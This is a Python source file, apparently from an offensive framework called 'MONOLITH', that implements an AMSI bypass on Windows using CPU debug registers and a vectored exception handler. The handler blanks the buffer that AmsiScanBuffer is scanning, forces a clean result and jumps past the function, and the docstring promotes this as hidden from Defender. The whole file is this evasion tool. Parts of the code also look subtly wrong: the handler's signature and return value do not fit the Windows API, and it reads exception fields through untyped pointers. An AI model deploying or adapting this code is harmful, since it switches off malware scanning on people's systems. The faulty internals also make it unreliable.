"""
Hardware Breakpoint AMSI Bypass
================================
Uses CPU debug registers (DR0-DR3) to bypass AMSI without memory patching.

Technique:
1. Set DR0 = AmsiScanBuffer address
2. DR7 = enable local breakpoint 0
3. VectoredExceptionHandler catches single-step exception
4. On trigger: zero scan buffer + set result = S_OK
5. No memory modified - invisible to Defender watchdog/memory scanner

Advantages over memory patch:
- No static bytes modified = no watchdog detection
- No VirtualProtect/VirtualAlloc telemetry
- Hardware-level = invisible to user-mode hooks
- One-shot: buffer zeroed only when scan happens

Author: MONOLITH Framework
"""

import ctypes
import ctypes.wintypes
import platform
import sys
import threading
from typing import Optional, Callable
from dataclasses import dataclass
from enum import Enum


class HWBStatus(Enum):
    READY = "ready"
    ACTIVE = "active"
    TRIGGERED = "triggered"
    DISABLED = "disabled"
    ERROR = "error"


@dataclass
class HWBPResult:
    success: bool
    status: HWBStatus = HWBStatus.ERROR
    scans_intercepted: int = 0
    error: Optional[str] = None
    amsi_addr: int = 0


class HWBPAMSIBypass:
    """
    Hardware Breakpoint-based AMSI bypass.

    Uses x64 debug registers DR0-DR3 + VectoredExceptionHandler.
    """

    def __init__(self):
        self._system = platform.system()
        self._active = False
        self._veh_handler = None
        self._amsi_scan_buffer_addr: int = 0
        self._scan_count = 0
        self._lock = threading.Lock()
        self._kernel32 = None
        self._ntdll = None

        if self._system == "Windows":
            self._kernel32 = ctypes.windll.kernel32
            self._ntdll = ctypes.windll.ntdll
            self._resolve_amsi()
        else:
            self._status = HWBStatus.ERROR
            self._error_msg = "Windows-only"

    # =========================================================================
    # PUBLIC API
    # =========================================================================
    def enable(self) -> HWBPResult:
        """Enable HWBP-based AMSI bypass."""
        if self._system != "Windows":
            return HWBPResult(False, HWBStatus.ERROR, error="Windows-only")

        if not self._amsi_scan_buffer_addr:
            return HWBPResult(False, HWBStatus.ERROR, error="AmsiScanBuffer not found")

        try:
            self._veh_handler = self._register_veh()
            if not self._veh_handler:
                return HWBPResult(False, HWBStatus.ERROR, error="VectoredHandler registration failed")

            self._set_hwbp(self._amsi_scan_buffer_addr)
            self._active = True
            return HWBPResult(True, HWBStatus.ACTIVE, amsi_addr=self._amsi_scan_buffer_addr)
        except Exception as exc:
            return HWBPResult(False, HWBStatus.ERROR, error=str(exc))

    def disable(self) -> HWBPResult:
        """Disable HWBP bypass and restore state."""
        if not self._active:
            return HWBPResult(True, HWBStatus.DISABLED)

        try:
            self._clear_hwbp()
            if self._veh_handler:
                self._kernel32.RemoveVectoredExceptionHandler(self._veh_handler)
                self._veh_handler = None
            self._active = False
            return HWBPResult(True, HWBStatus.DISABLED)
        except Exception as exc:
            return HWBPResult(False, HWBStatus.ERROR, error=str(exc))

    def get_status(self) -> dict:
        """Get current bypass status."""
        return {
            "active": self._active,
            "amsi_address": f"0x{self._amsi_scan_buffer_addr:016X}" if self._amsi_scan_buffer_addr else "unknown",
            "scans_intercepted": self._scan_count,
            "system": self._system,
        }

    # =========================================================================
    # INTERNALS: RESOLVE AMSI
    # =========================================================================
    def _resolve_amsi(self):
        """Find AmsiScanBuffer address in memory."""
        try:
            h_amsi = self._kernel32.LoadLibraryA(b"amsi.dll")
            if not h_amsi:
                return
            addr = self._kernel32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
            if addr:
                self._amsi_scan_buffer_addr = addr
        except Exception:
            pass

    # =========================================================================
    # INTERNALS: HWBP SETUP
    # =========================================================================
    def _set_hwbp(self, address: int):
        """Set DR0 = address, enable local breakpoint 0."""
        ctx = self._get_current_thread_context()
        if not ctx:
            raise RuntimeError("GetThreadContext failed")

        ctx.Dr0 = address
        ctx.Dr7 = 0x00000001  # Local BP0, execute breakpoint
        ctx.ContextFlags = 0x10  # CONTEXT_DEBUG_REGISTERS
        self._set_thread_context(ctx)

    def _clear_hwbp(self):
        """Clear DR0-DR3 and DR7."""
        ctx = self._get_current_thread_context()
        if not ctx:
            return
        ctx.Dr0 = 0
        ctx.Dr1 = 0
        ctx.Dr2 = 0
        ctx.Dr3 = 0
        ctx.Dr6 = 0
        ctx.Dr7 = 0
        ctx.ContextFlags = 0x10
        self._set_thread_context(ctx)

    def _get_current_thread_context(self) -> Optional[ctypes.Structure]:
        """Get current thread context with debug registers."""
        class CONTEXT64(ctypes.Structure):
            _fields_ = [
                ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong),
                ("P3Home", ctypes.c_ulonglong), ("P4Home", ctypes.c_ulonglong),
                ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                ("ContextFlags", ctypes.c_ulong), ("MxCsr", ctypes.c_ulong),
                ("SegCs", ctypes.c_ushort), ("SegDs", ctypes.c_ushort),
                ("SegEs", ctypes.c_ushort), ("SegFs", ctypes.c_ushort),
                ("SegGs", ctypes.c_ushort), ("SegSs", ctypes.c_ushort),
                ("EFlags", ctypes.c_ulong),
                ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong),
                ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong),
                ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong),
                ("Rax", ctypes.c_ulonglong), ("Rcx", ctypes.c_ulonglong),
                ("Rdx", ctypes.c_ulonglong), ("Rbx", ctypes.c_ulonglong),
                ("Rsp", ctypes.c_ulonglong), ("Rbp", ctypes.c_ulonglong),
                ("Rsi", ctypes.c_ulonglong), ("Rdi", ctypes.c_ulonglong),
                ("R8", ctypes.c_ulonglong), ("R9", ctypes.c_ulonglong),
                ("R10", ctypes.c_ulonglong), ("R11", ctypes.c_ulonglong),
                ("R12", ctypes.c_ulonglong), ("R13", ctypes.c_ulonglong),
                ("R14", ctypes.c_ulonglong), ("R15", ctypes.c_ulonglong),
                ("Rip", ctypes.c_ulonglong),
            ]

        ctx = CONTEXT64()
        ctx.ContextFlags = 0x10  # CONTEXT_DEBUG_REGISTERS
        h_thread = self._kernel32.GetCurrentThread()
        if not h_thread:
            return None
        if not self._kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
            return None
        return ctx

    def _set_thread_context(self, ctx):
        """Set current thread context."""
        h_thread = self._kernel32.GetCurrentThread()
        if h_thread:
            self._kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))

    # =========================================================================
    # INTERNALS: VECTORED EXCEPTION HANDLER
    # =========================================================================
    def _register_veh(self):
        """Register vectored exception handler for hardware breakpoint."""
        @ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))
        def veh_handler(exception_pointers, context):
            try:
                self._handle_exception(exception_pointers, context)
            except Exception:
                pass
            return 0  # Continue search / execute handler

        handler = self._kernel32.AddVectoredExceptionHandler(1, veh_handler)
        return handler if handler else None

    def _handle_exception(self, exception_pointers: ctypes.POINTER, context: ctypes.POINTER):
        """
        Handle EXCEPTION_SINGLE_STEP from HWBP on AmsiScanBuffer.
        When triggered:
        1. Zero out scan buffer contents (RDX, R8)
        2. Set HRESULT out-param to S_OK
        3. Set RAX = 0
        4. Clear breakpoint to prevent re-trigger
        """
        if not self._active or not self._amsi_scan_buffer_addr:
            return

        try:
            exc_record = exception_pointers.contents
            ctx_ref = context.contents

            if exc_record.ExceptionCode != 0x80000004:  # STATUS_SINGLE_STEP
                return

            # Check if breakpoint hit our target
            if ctx_ref.Rip != self._amsi_scan_buffer_addr:
                return

            with self._lock:
                self._scan_count += 1

            # Zero out scan buffer: RDX = buffer, R8 = length
            if ctx_ref.Rdx and ctx_ref.R8:
                length = min(ctx_ref.R8, 65536)
                ctypes.memset(ctx_ref.Rdx, 0, length)

            # Set the HRESULT* out-parameter to S_OK (0)
            # Stack layout on x64: shadow space (32 bytes) + 4 args = RCX,RDX,R8,R9 + stack
            # AmsiScanBuffer signature:
            #   session(RCX), buffer(RDX), length(R8), contentName(R9),
            #   attributes(stack), attributesSize(stack), result(stack)
            # result is at RSP + 40 after shadow space
            result_ptr = ctypes.c_void_p.from_address(ctx_ref.Rsp + 40)
            if result_ptr and result_ptr.value:
                ctypes.memset(result_ptr.value, 0, 4)  # S_OK = 0x00000000

            # Set return value to S_OK
            ctx_ref.Rax = 0

            # Skip past the function prolog to the ret instruction
            # AmsiScanBuffer prolog is typically: sub rsp, 0x28 ; ... ; ret
            # We scan forward from current RIP for a ret (0xC3)
            scan_start = ctx_ref.Rip
            scan_limit = scan_start + 64
            found_ret = False

            while scan_start < scan_limit:
                byte = ctypes.c_ubyte.from_address(scan_start).value
                if byte == 0xC3:  # ret
                    ctx_ref.Rip = scan_start
                    found_ret = True
                    break
                scan_start += 1

            if not found_ret:
                ctx_ref.Rip += 5  # fallback: skip prolog

            # Clear breakpoint immediately after intercept
            ctx_ref.Dr0 = 0
            ctx_ref.Dr7 = 0
            ctx_ref.ContextFlags = 0x10

        except Exception:
            pass


# =============================================================================
# CONVENIENCE / ONE-SHOT API
# =============================================================================

_hwbp_instance: Optional[HWBPAMSIBypass] = None
_hwbp_lock = threading.Lock()


def get_hwbp_amsi_bypass() -> HWBPAMSIBypass:
    """Get singleton HWBP AMSI bypass instance."""
    global _hwbp_instance
    if _hwbp_instance is None:
        with _hwbp_lock:
            if _hwbp_instance is None:
                _hwbp_instance = HWBPAMSIBypass()
    return _hwbp_instance


def enable_amsi_hwbp() -> HWBPResult:
    """One-call enable HWBP AMSI bypass."""
    engine = get_hwbp_amsi_bypass()
    return engine.enable()


def disable_amsi_hwbp() -> HWBPResult:
    """One-call disable HWBP AMSI bypass."""
    engine = get_hwbp_amsi_bypass()
    return engine.disable()


def is_amsi_hwbp_active() -> bool:
    """Check if HWBP bypass is active."""
    engine = get_hwbp_amsi_bypass()
    return engine._active
